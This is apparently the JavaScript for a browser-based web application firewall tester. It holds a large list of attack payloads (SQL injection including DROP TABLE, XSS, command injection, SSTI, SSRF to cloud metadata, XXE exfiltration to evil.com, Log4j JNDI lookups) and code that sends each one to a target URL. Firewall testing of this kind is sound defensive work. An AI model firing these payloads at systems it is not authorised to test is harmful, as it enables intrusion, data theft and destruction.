// Configuration et payloads basés sur waf-checker (https://github.com/SecH0us3/waf-checker)
const PAYLOADS = {
    'SQLi': [
        // Basic SQL Injection
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "admin'--",
        "admin' #",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "1 UNION SELECT 1,2,3--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT 1,2,3--",
        // Time-based
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "1' AND SLEEP(5)#",
        "1' AND BENCHMARK(5000000,SHA1('test'))--",
        // Error-based
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        // Bypass attempts
        "' oR '1'='1",
        "'/**/OR/**/1=1--",
        "' /*!50000OR*/ 1=1--",
        "'%20OR%201=1--",
        "' OR 'x'='x",
        "1'||'1'='1",
        // Advanced
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','hacked')--",
        "1; EXEC xp_cmdshell('whoami')--"
    ],
    'XSS': [
        // Basic XSS
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('XSS')>",
        "<svg/onload=alert(1)>",
        "<body onload=alert('XSS')>",
        // Event handlers
        "<div onmouseover=alert('XSS')>hover me</div>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        // JavaScript protocol
        "<a href=javascript:alert('XSS')>click</a>",
        "<iframe src=javascript:alert('XSS')>",
        // Encoded payloads
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        // Bypass attempts
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<<script>alert('XSS');//<</script>",
        "<img src=\"x\" onerror=\"alert('XSS')\">",
        "<svg><script>alert&#40;'XSS'&#41;</script>",
        // DOM-based
        "javascript:alert('XSS')",
        "'-alert('XSS')-'",
        "\";alert('XSS');//"
    ],
    'Path Traversal': [
        // Basic traversal
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\..\\windows\\system.ini",
        // Encoded
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%255c..%255c..%255cwindows%255cwin.ini",
        // Null byte
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        // Filter bypass
        "....//....//....//etc/passwd",
        "..../..../..../etc/passwd",
        "..;/..;/..;/etc/passwd"
    ],
    'Command Injection': [
        // Basic injection
        "; ls -la",
        "| ls -la",
        "& ls -la",
        "&& ls -la",
        "|| ls -la",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; id",
        "| id",
        "; whoami",
        "| whoami",
        // Subshell
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
        "$(id)",
        "`id`",
        // Newline
        "%0a cat /etc/passwd",
        "%0d%0a cat /etc/passwd",
        // Blind
        "; sleep 5",
        "| sleep 5",
        "; ping -c 5 127.0.0.1",
        // Bypass
        ";c'a't /etc/passwd",
        ";ca$@t /etc/passwd",
        ";{cat,/etc/passwd}"
    ],
    'SSRF': [
        // Localhost
        "http://127.0.0.1/",
        "http://localhost/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:443/",
        "http://127.0.0.1:22/",
        "http://127.0.0.1:3306/",
        // IPv6
        "http://[::1]/",
        "http://[0000::1]/",
        "http://[::ffff:127.0.0.1]/",
        // Alternative representations
        "http://127.1/",
        "http://0177.0.0.1/",
        "http://2130706433/",
        "http://0x7f000001/",
        "http://0/",
        // Cloud metadata
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        // File protocol
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        // URL tricks
        "http://evil.com@127.0.0.1/",
        "http://127.0.0.1#@evil.com/",
        "http://127.0.0.1%23@evil.com/"
    ],
    'NoSQLi': [
        // MongoDB operators
        "{\"$gt\":\"\"}",
        "{\"$ne\":null}",
        "{\"$ne\":\"\"}",
        "{\"$regex\":\".*\"}",
        "{\"$where\":\"1==1\"}",
        // Authentication bypass
        "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
        "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
        "{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}",
        // Array injection
        "{\"$or\":[{},{}]}",
        "{\"$or\":[{\"a\":\"a\"},{\"b\":\"b\"}]}",
        // JavaScript injection
        "{\"$where\":\"this.password.length > 0\"}",
        "{\"$where\":\"sleep(5000)\"}",
        // URL encoded
        "username[$ne]=&password[$ne]=",
        "username=admin&password[$gt]="
    ],
    'LFI': [
        // PHP wrappers
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "php://input",
        "php://data",
        "data://text/plain,<?php phpinfo()?>",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=",
        // File access
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        // Windows
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        // Path traversal + LFI
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%00/etc/passwd"
    ],
    'SSTI': [
        // Detection
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "@(7*7)",
        // Jinja2
        "{{config}}",
        "{{config.items()}}",
        "{{self.__class__.__mro__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        // Twig
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        // Freemarker
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        // ERB
        "<%= system('id') %>",
        "<%= `id` %>",
        // Smarty
        "{php}echo `id`;{/php}",
        "{system('id')}"
    ],
    'XXE': [
        // Basic XXE
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
        // External DTD
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\"> %xxe;]><foo>test</foo>",
        // Parameter entities
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?data=%file;'>\">%eval;%exfil;]>",
        // PHP filter
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
        // Windows
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
        // Expect
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
        // SSRF via XXE
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"
    ],
    'HTTP Header Injection': [
        // CRLF Injection
        "%0d%0aSet-Cookie:malicious=true",
        "%0d%0aX-Injected:header",
        "%0aSet-Cookie:malicious=true",
        "%0d%0aLocation:http://evil.com",
        // Double encoding
        "%250d%250aSet-Cookie:malicious=true",
        // Host header
        "evil.com",
        "localhost",
        "127.0.0.1",
        // X-Forwarded headers
        "X-Forwarded-For: 127.0.0.1",
        "X-Forwarded-Host: evil.com",
        "X-Forwarded-Proto: https",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin"
    ],
    'Open Redirect': [
        // Basic redirects
        "//evil.com",
        "///evil.com",
        "////evil.com",
        "http://evil.com",
        "https://evil.com",
        // URL tricks
        "/\\evil.com",
        "\\/evil.com",
        "//evil.com/%2F..",
        "//evil.com/%2f%2e%2e",
        // Protocol tricks
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        // Encoded
        "//evil%E3%80%82com",
        "////evil.com",
        "https:evil.com",
        // URL parsing confusion
        "http://google.com@evil.com",
        "http://evil.com#@google.com"
    ],
    'Sensitive Files': [
        // Git
        ".git/config",
        ".git/HEAD",
        ".gitignore",
        // Config files
        ".env",
        ".env.local",
        ".env.production",
        "config.php",
        "wp-config.php",
        "web.config",
        "appsettings.json",
        // Dependencies
        "package.json",
        "package-lock.json",
        "composer.json",
        "requirements.txt",
        "Gemfile",
        // Backup files
        "backup.sql",
        "database.sql",
        "dump.sql",
        ".bak",
        "~",
        // Server files
        ".htaccess",
        ".htpasswd",
        "server-status",
        "nginx.conf",
        // SSH
        ".ssh/id_rsa",
        ".ssh/authorized_keys",
        // Docker
        "docker-compose.yml",
        "Dockerfile"
    ],
    'IP Bypass': [
        "X-Forwarded-For: 127.0.0.1",
        "X-Forwarded-For: localhost",
        "X-Forwarded-For: 10.0.0.1",
        "X-Forwarded-For: 192.168.1.1",
        "X-Client-IP: 127.0.0.1",
        "X-Real-IP: 127.0.0.1",
        "X-Remote-IP: 127.0.0.1",
        "X-Remote-Addr: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1",
        "True-Client-IP: 127.0.0.1",
        "Cluster-Client-IP: 127.0.0.1",
        "X-Forwarded: 127.0.0.1",
        "Forwarded-For: 127.0.0.1",
        "Forwarded: for=127.0.0.1"
    ],
    'HTTP Parameter Pollution': [
        "param=1&param=2",
        "param=value1&param=value2",
        "user=admin&user=guest",
        "id=1&id=2&id=3",
        "param[]=1&param[]=2",
        "param[0]=1&param[1]=2",
        "param=1%26param=2",
        "action=view&action=delete"
    ],
    'Log4j/JNDI': [
        "${jndi:ldap://evil.com/a}",
        "${jndi:rmi://evil.com/a}",
        "${jndi:dns://evil.com/a}",
        "${${lower:j}ndi:ldap://evil.com/a}",
        "${${upper:j}ndi:ldap://evil.com/a}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}",
        "${jndi:ldap://127.0.0.1:1389/a}",
        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/a}"
    ]
};

// Variables globales
let results = [];
let stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
let isRunning = false;
let shouldStop = false;

// Initialisation
function init() {
    // URL par défaut - utilise l'URL complète du site actuel
    const targetUrlInput = document.getElementById('targetUrl');
    if (targetUrlInput) {
        targetUrlInput.value = window.location.origin;
        targetUrlInput.placeholder = window.location.origin;
    }
    
    // Générer les catégories
    generateCategories();
    
    console.log('WAF Tests initialized with', Object.keys(PAYLOADS).length, 'categories');
}

// Exécuter l'init quand le DOM est prêt
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    // DOM déjà chargé
    init();
}

function generateCategories() {
    const categoriesDiv = document.getElementById('categories');
    if (!categoriesDiv) {
        console.error('Element #categories not found');
        return;
    }
    
    categoriesDiv.innerHTML = '';
    
    const categories = Object.keys(PAYLOADS);
    console.log('Generating', categories.length, 'categories');
    
    categories.forEach(category => {
        const payloadCount = PAYLOADS[category].length;
        const label = document.createElement('label');
        label.className = 'flex items-center gap-2 px-3 py-2 rounded-lg border cursor-pointer transition-colors';
        label.style.cssText = 'background: rgba(30, 41, 59, 0.8); border-color: rgba(51, 65, 85, 1);';
        label.onmouseenter = () => label.style.borderColor = 'rgba(244, 63, 94, 0.8)';
        label.onmouseleave = () => label.style.borderColor = 'rgba(51, 65, 85, 1)';
        
        const checkbox = document.createElement('input');
        checkbox.type = 'checkbox';
        checkbox.className = 'category-checkbox';
        checkbox.value = category;
        checkbox.checked = true;
        checkbox.style.accentColor = '#f43f5e';
        
        const nameSpan = document.createElement('span');
        nameSpan.className = 'text-sm';
        nameSpan.style.color = '#fff';
        nameSpan.textContent = category;
        
        const countSpan = document.createElement('span');
        countSpan.className = 'text-xs';
        countSpan.style.color = '#64748b';
        countSpan.textContent = `(${payloadCount})`;
        
        label.appendChild(checkbox);
        label.appendChild(nameSpan);
        label.appendChild(countSpan);
        categoriesDiv.appendChild(label);
    });
}

function selectAllCategories() {
    document.querySelectorAll('.category-checkbox').forEach(cb => cb.checked = true);
}

function deselectAllCategories() {
    document.querySelectorAll('.category-checkbox').forEach(cb => cb.checked = false);
}

// Fonctions principales
async function runAllTests() {
    const targetUrl = document.getElementById('targetUrl').value.trim();
    if (!targetUrl) {
        alert('Veuillez entrer une URL cible');
        return;
    }

    // Récupérer les méthodes sélectionnées
    const methods = Array.from(document.querySelectorAll('.method-checkbox:checked'))
        .map(cb => cb.value);

    if (methods.length === 0) {
        alert('Veuillez sélectionner au moins une méthode HTTP');
        return;
    }

    // Récupérer les catégories sélectionnées
    const categories = Array.from(document.querySelectorAll('.category-checkbox:checked'))
        .map(cb => cb.value);

    if (categories.length === 0) {
        alert('Veuillez sélectionner au moins une catégorie');
        return;
    }

    // Réinitialiser
    results = [];
    stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
    shouldStop = false;
    isRunning = true;

    document.getElementById('stopBtn').classList.remove('hidden');
    document.getElementById('progressBar').classList.remove('hidden');

    // Construire la liste des tests
    const tests = [];
    categories.forEach(category => {
        const payloads = PAYLOADS[category];
        methods.forEach(method => {
            payloads.forEach(payload => {
                tests.push({ category, method, payload });
            });
        });
    });

    const total = tests.length;
    let completed = 0;

    // Lancer les tests avec concurrence limitée
    const concurrency = 5;
    for (let i = 0; i < tests.length; i += concurrency) {
        if (shouldStop) break;

        const batch = tests.slice(i, i + concurrency);
        await Promise.all(batch.map(test => runSingleTest(targetUrl, test)));

        completed += batch.length;
        updateProgress(completed, total);
    }

    isRunning = false;
    document.getElementById('stopBtn').classList.add('hidden');
    updateStats();
}

async function runSingleTest(baseUrl, { category, method, payload }) {
    try {
        let url = baseUrl;
        let options = {
            method: method,
            headers: {
                'X-Vuln-Type': category.toLowerCase().replace(/\s+/g, '-')
            }
        };

        // Construire l'URL et les options selon la catégorie
        if (category === 'Sensitive Files') {
            url = `${baseUrl}/${payload}`;
        } else if (category.includes('Header') || category.includes('Cache') || category.includes('IP') || category === 'User-Agent') {
            // Headers spéciaux
            const [headerName, headerValue] = payload.split(':').map(s => s.trim());
            if (headerName && headerValue) {
                options.headers[headerName] = headerValue;
            }
            url = `${baseUrl}/?test=${encodeURIComponent(payload)}`;
        } else if (method === 'GET') {
            url = `${baseUrl}/?payload=${encodeURIComponent(payload)}`;
        } else {
            // POST, PUT, DELETE
            if (category === 'XXE') {
                options.headers['Content-Type'] = 'application/xml';
                options.body = payload;
            } else if (payload.startsWith('{')) {
                options.headers['Content-Type'] = 'application/json';
                options.body = payload;
            } else {
                options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                options.body = `payload=${encodeURIComponent(payload)}`;
            }
        }

        const response = await fetch(url, options);
        const status = response.status;

        let statusLabel = status.toString();
        if (status >= 300 && status < 400) statusLabel = '301';
        else if (status === 403) statusLabel = '403';
        else if (status >= 200 && status < 300) statusLabel = '200';
        else statusLabel = 'ERR';

        results.push({
            category,
            method,
            status: statusLabel,
            payload: payload.substring(0, 100) + (payload.length > 100 ? '...' : '')
        });

        stats.total++;
        stats[statusLabel] = (stats[statusLabel] || 0) + 1;

        updateTable();
        updateStats();

    } catch (error) {
        results.push({
            category,
            method,
            status: 'ERR',
            payload: payload.substring(0, 100) + (payload.length > 100 ? '...' : '')
        });

        stats.total++;
        stats['err']++;

        updateTable();
        updateStats();
    }
}

function stopTests() {
    shouldStop = true;
    isRunning = false;
    document.getElementById('stopBtn').classList.add('hidden');
}

function clearResults() {
    results = [];
    stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
    updateTable();
    updateStats();
    document.getElementById('progressBar').classList.add('hidden');
}

function updateProgress(current, total) {
    const percent = (current / total * 100).toFixed(1);
    document.getElementById('progress').style.width = percent + '%';
    document.getElementById('progressText').textContent = `${current} / ${total}`;
}

function updateTable() {
    const tbody = document.getElementById('resultsTable');
    
    if (results.length === 0) {
        tbody.innerHTML = `
            <tr>
                <td colspan="4" class="py-12 text-center text-dark-400">
                    <div class="w-16 h-16 rounded-2xl bg-dark-800 flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-flask-vial text-dark-500 text-2xl"></i>
                    </div>
                    <p>Aucun résultat</p>
                    <p class="text-dark-500 text-sm mt-1">Lancez les tests pour commencer</p>
                </td>
            </tr>
        `;
        return;
    }

    tbody.innerHTML = results.slice(-100).reverse().map(result => `
        <tr class="hover:bg-dark-800/50 transition-colors">
            <td class="py-3 px-6 text-white text-sm">${result.category}</td>
            <td class="py-3 px-6">
                <span class="px-2 py-1 rounded-lg text-xs font-mono font-medium ${getMethodColor(result.method)}">${result.method}</span>
            </td>
            <td class="py-3 px-6">
                <span class="status-${result.status.toLowerCase()} px-2.5 py-1 rounded-lg font-mono text-xs font-medium">${result.status}</span>
            </td>
            <td class="py-3 px-6 text-dark-300 font-mono text-xs break-all max-w-md">${escapeHtml(result.payload)}</td>
        </tr>
    `).join('');
}

function updateStats() {
    document.getElementById('stat-total').textContent = stats.total;
    document.getElementById('stat-200').textContent = stats['200'] || 0;
    document.getElementById('stat-403').textContent = stats['403'] || 0;
    document.getElementById('stat-301').textContent = stats['301'] || 0;
    document.getElementById('stat-err').textContent = stats['err'] || 0;
}

function getMethodColor(method) {
    const colors = {
        'GET': 'bg-blue-500/20 text-blue-400',
        'POST': 'bg-emerald-500/20 text-emerald-400',
        'PUT': 'bg-amber-500/20 text-amber-400',
        'DELETE': 'bg-rose-500/20 text-rose-400'
    };
    return colors[method] || 'bg-dark-600 text-dark-300';
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
